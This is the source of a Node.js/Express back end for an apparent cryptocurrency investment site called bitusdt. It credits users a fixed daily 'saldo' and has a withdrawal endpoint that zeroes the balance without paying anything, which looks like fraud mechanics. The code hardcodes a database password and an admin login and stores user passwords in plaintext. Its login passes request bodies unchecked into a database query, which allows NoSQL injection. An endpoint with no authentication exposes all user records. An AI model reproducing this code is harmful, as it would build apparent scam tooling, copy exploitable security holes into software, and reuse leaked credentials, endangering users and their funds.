const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

mongoose.connect("mongodb+srv://bitusdt:bitusdt123@cluster0.mongodb.net/bitusdt");

const User = mongoose.model("User",{
 email:String,
 password:String,
 saldo:Number,
 dias:Number,
 wallet:String,
 referido:String
});

const Admin = {
 email:"Binancecoin958@gmail.com",
 pass:"Enriique1998"
};

/* REGISTRO */
app.post("/api/register",async(req,res)=>{
 const u = await User.findOne({email:req.body.email});
 if(u) return res.json({msg:"Ya existe"});
 await User.create({
  email:req.body.email,
  password:req.body.password,
  saldo:0,
  dias:0,
  wallet:"",
  referido:req.body.ref
 });
 res.json({ok:true});
});

/* LOGIN */
app.post("/api/login",async(req,res)=>{
 if(req.body.email==Admin.email &&
    req.body.password==Admin.pass)
 return res.json({admin:true});

 const u = await User.findOne(req.body);
 if(!u) return res.json({msg:"Error"});
 res.json(u);
});

/* INVERTIR */
app.post("/api/invert",async(req,res)=>{
 await User.updateOne(
 {email:req.body.email},
 {$set:{wallet:req.body.wallet}}
 );
 res.json({ok:true});
});

/* LISTA ADMIN */
app.get("/api/users",async(req,res)=>{
 res.json(await User.find());
});

/* RETIRO */
app.post("/api/retirar",async(req,res)=>{
 const u=await User.findOne({email:req.body.email});
 if(u.saldo<20) return res.json({msg:"Min 20"});
 u.saldo=0; u.dias=0;
 await u.save();
 res.json({ok:true});
});

/* GANANCIA DIARIA */
setInterval(async()=>{
 const users=await User.find();
 users.forEach(u=>{
  if(u.dias<20){
   u.dias++;
   u.saldo++;
   u.save();
  }
 });
},86400000);

app.listen(3000);
